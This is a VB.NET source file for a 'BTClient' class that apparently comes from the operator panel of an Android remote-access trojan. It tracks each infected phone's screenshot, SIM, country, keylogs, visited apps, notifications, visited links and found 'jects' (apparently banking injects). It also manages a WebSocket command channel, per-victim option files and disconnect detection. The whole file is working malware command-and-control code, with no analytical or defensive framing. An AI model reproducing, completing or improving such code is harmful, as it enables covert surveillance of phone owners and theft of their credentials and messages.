Imports System.IO
Imports System.Net
Imports System.Net.Http
Imports System.Threading
Imports DrakeUI.Framework
Imports Newtonsoft.Json
Imports Newtonsoft.Json.Linq

Public Class BTClient
    Public screen As Bitmap
    Public wallpaper As Bitmap
    Public flag As Bitmap
    Public wifi As Bitmap
    Public battery As Bitmap
    Public name As String
    Public android As String
    Public row As DataGridViewRow
    Public address As String
    Public mobid As String
    Public Tag As String
    Public version As String
    Public tracking As String
    Public installdate As String
    Public pingms As String
    Public country As String
    Public sim As String
    Public MobName As String
    Public activewindow As String = ""
    Public userfolder As String = ""


    Public keyloggs As String = "null"
    Public visitedapps As String = "null"
    Public activies As String = "null"
    Public notifications As String = "null"
    Public visitedlinks As String = "null"

    Public Foundedjects As String = "N/A"

    Public SecoundIDF As String = "null"
    Public jects_count As String = "0"

    Public angle As String = "0"
    Public lights As String = "0"
    Public charging As String = "0"


    Public startTime As DateTime

    Private pingThread As Thread
    Public sockth As Thread
    Public httpClient As HttpClient

    Public isConnected As Boolean = False

    Public UpdateRequested As Boolean = False
    Public UpdateTag As String = "N/A"

    ' Constructor to initialize all properties
    Sub New(cli_name As String,
        cli_screen As Bitmap,
        cli_wallpaper As Bitmap,
        cli_flag As Bitmap,
        cli_wifi As Bitmap,
        cli_battery As Bitmap,
        cli_android As String,
        cli_address As String,
        cli_mobid As String,
        cli_version As String,
        cli_installdate As String,
        cli_tracking As String,
        cli_country As String,
        cli_sim As String,
        cli_ping As String,
        cli_keylogs As String,
        cli_vapps As String,
        cli_activz As String,
        cli_notifys As String,
        cli_vLinks As String,
        cli_chrg As String,
        cli_mobname As String,
            cli_tag As String)




        Try
            name = cli_name
            screen = CType(cli_screen.Clone(), Bitmap)
            wallpaper = CType(cli_wallpaper.Clone(), Bitmap)
            flag = CType(cli_flag.Clone(), Bitmap)
            wifi = CType(cli_wifi.Clone(), Bitmap)
            battery = CType(cli_battery.Clone(), Bitmap)
            android = cli_android
            address = cli_address
            mobid = cli_mobid
            version = "v3.6.1" 'cli_version
            tracking = cli_tracking
            installdate = cli_installdate
            pingms = cli_ping
            country = cli_country
            sim = cli_sim
            charging = cli_chrg
            MobName = cli_mobname
            Tag = cli_tag

            isConnected = True

            Me.startTime = DateTime.Now.AddSeconds(90)




            keyloggs = cli_keylogs
            visitedapps = cli_vapps
            activies = cli_activz
            notifications = cli_notifys
            visitedlinks = cli_vLinks
        Catch ex As Exception
            Log_e("Construc-clint", EXtoString(ex))
        End Try

    End Sub

    Public Websockclient As WebSocketClient
    Public Function CreateSocket(nextkey As String, ClassClient As BTClient)

        Try
            ClassClient.userfolder = MyRes.CreateCilentfolder(ClassClient)

            '            Thread.Sleep(100)

            'Dim datajoin As String = Await JoinServer(New With {
            '      .case = "join",
            '      .ping = "0",
            '      .ismain = "0",
            '      .chk = nextkey
            ' }, httpClient)



            ' Dim result As JObject = JObject.Parse(datajoin) ' it does not get reach after while only on start some times 

            ' Check the result for success or failure
            ' If result("Success") IsNot Nothing Then
            'Dim datastr As String = result("Success").ToString.Trim("""")
            ' Log_d("Cli IDF websock", datastr)
            'Main_IDF = datastr

            'ClassClient.Websockclient = New WebSocketClient(newclistr, address)

            'Dim connectionThread = New Thread(Sub() ClassClient.Websockclient.Connect(datastr))
            '    connectionThread.IsBackground = True
            '    connectionThread.Start()

            'Do
            '        Thread.Sleep(1)
            '    Loop While Not ClassClient.Websockclient.IsConnected

            ' Log_d("IDF Ready to use", datastr)

            'ssClient.SecoundIDF = datastr

            Dim optndata As New Dictionary(Of String, Object) From {
                                {"msg", optns},
                                {"sidf", ClassClient.SecoundIDF},
                                {"op", ReadOptions()}
                }
                BTEngine.MainForm.webSocketClient.SendComCommand(optndata, mobid)

            Me.pingThread = New Thread(AddressOf DisconnectDetector)
            Me.pingThread.IsBackground = True
            Me.pingThread.Start(ClassClient)

            Exit Function
            'ElseIf result("Fail") IsNot Nothing Then
            '    Log_e("CreateFail", result("Fail").ToString())
            '    '  MyMsg.Show("failed: ", result("Fail").ToString(), msgtype.errors, False)
            'Else
            '    Log_e("CreateFail", result.ToString())
            'End If
        Catch ex As Exception
            Log_e("CreateSocket", EXtoString(ex))
        End Try
    End Function
    'Public Sub ClientCommand(chatData As Dictionary(Of String, Object), mobpid As String)
    '    Me.Websockclient.SendComCommand(chatData, mobpid)

    'End Sub

    Public Sub IamOnline()
        ' Extend the start time by 60 seconds on ping response
        Try
            isConnected = True
            Me.startTime = DateTime.Now.AddSeconds(90)
        Catch ex As Exception
            Log_e("IamOnline", EXtoString(ex))
        End Try

    End Sub

    Private Sub DisconnectDetector(ClassClient As BTClient)
        While BTEngine.MainForm.Alive

            Try
                Thread.Sleep(5000)
                If DateTime.Now >= startTime Then
                    ClassClient.isConnected = False


                    Console.WriteLine("Client did not ping for 1 min, discounneted.")
                    'BTEngine.MainForm.RemoveClient(New Object() {Me})

                    If ClassClient.row IsNot Nothing Then
                        BTEngine.MainForm.Invoke(Sub()
                                                     Try
                                                         BTEngine.MainForm.DGV0.Rows.Remove(ClassClient.row)
                                                         BTEngine.MainForm.LogConnection(BTConst.Connectedstr, connectionicon("out"), ClassClient.address, ClassClient.name)
                                                         'If ClassClient.Websockclient IsNot Nothing Then
                                                         '    ClassClient.Websockclient.Disconnect(timoutstr, address)
                                                         'End If
                                                         BTEngine.clients.Remove(ClassClient.mobid)
                                                         ClassClient.row = Nothing
                                                         If BTRegistry.ReadBool(BTSettings.Notify_disconnect) Then
                                                             BTAlerter.custom(Disconnectedstr + ": " + ClassClient.name,
                                                                              ClassClient.wallpaper, Color.Red)
                                                         End If
                                                     Catch ex As Exception
                                                         Log_e("removerow", EXtoString(ex))
                                                     End Try
                                                 End Sub)

                    End If





                    'ClassClient.wallpaper.Dispose()
                    'ClassClient.screen.Dispose()
                    'ClassClient.wifi.Dispose()
                    'ClassClient.battery.Dispose()
                    'ClassClient.flag.Dispose()



                    Exit While

                Else
                    If Websockclient Is Nothing Then
                        Log_d("problem", "client connected but socket no")
                    End If
                    If Not isConnected AndAlso Me.row IsNot Nothing Then
                        Log_d("ClientWatch", "Reconnecting Client")
                        'Me.sockth = New Thread(AddressOf Me.CreateSocket)
                        'Me.sockth.IsBackground = True
                        'Me.sockth.Start(BTEngine.MainForm.Mainnextkey)

                    End If
                End If

            Catch ex As Exception
                Exit While
            End Try

        End While
    End Sub


    'userfolder & "\" & "options.json"

    Private Firstload As Boolean = True

    Public Function ReadOptions() As String


        Try
            Dim filePath As String = Path.Combine(userfolder, "options.json")


            Dim defaultJson As String = BTRegistry.GetValue(BTSettings.Defconfig, My.Resources.Deafult_mob_optns)


            Dim defaultOptions As Dictionary(Of String, String) =
            JsonConvert.DeserializeObject(Of Dictionary(Of String, String))(defaultJson)

            Dim userOptions As Dictionary(Of String, String)

            If File.Exists(filePath) Then

                Dim json = File.ReadAllText(filePath)
                userOptions = JsonConvert.DeserializeObject(Of Dictionary(Of String, String))(json)


                If Firstload Then
                    If userOptions Is Nothing Then userOptions = New Dictionary(Of String, String)()
                    For Each kvp In defaultOptions
                        If Not userOptions.ContainsKey(kvp.Key) Then '**userOptions** was Nothing, null ref why?
                            userOptions(kvp.Key) = kvp.Value
                        End If
                    Next


                    Dim updatedJson As String = JsonConvert.SerializeObject(userOptions, Formatting.Indented)
                    File.WriteAllText(filePath, updatedJson)
                    Firstload = False
                    Return updatedJson
                Else
                    Return JsonConvert.SerializeObject(userOptions)
                End If

            Else

                File.WriteAllText(filePath, defaultJson)
                Firstload = False
                Return defaultJson
            End If

        Catch ex As Exception
            ' MsgBox(ex.Message & " ERROR 1")
            Return My.Resources.Deafult_mob_optns
        End Try
    End Function



    Public Sub UpdateOption(key As String, value As String)
        Try
            Dim filePath As String = userfolder & "\" & "options.json"
            If Not File.Exists(filePath) Then
                File.WriteAllText(filePath, BTRegistry.GetValue(BTSettings.Defconfig, My.Resources.Deafult_mob_optns))
            End If
            If File.Exists(filePath) Then
                ' Read existing options as a dictionary
                Dim jsonContent As String = File.ReadAllText(filePath)
                Dim options As Dictionary(Of String, String) = JsonConvert.DeserializeObject(Of Dictionary(Of String, String))(jsonContent)

                ' Update or add the key-value pair
                If options.ContainsKey(key) Then
                    options(key) = value
                Else
                    options.Add(key, value)
                End If

                ' Write updated JSON back to file
                Dim updatedJson As String = JsonConvert.SerializeObject(options, Formatting.Indented)
                File.WriteAllText(filePath, updatedJson)
            End If
        Catch ex As Exception
            ' Handle exception as needed
        End Try
    End Sub



End Class
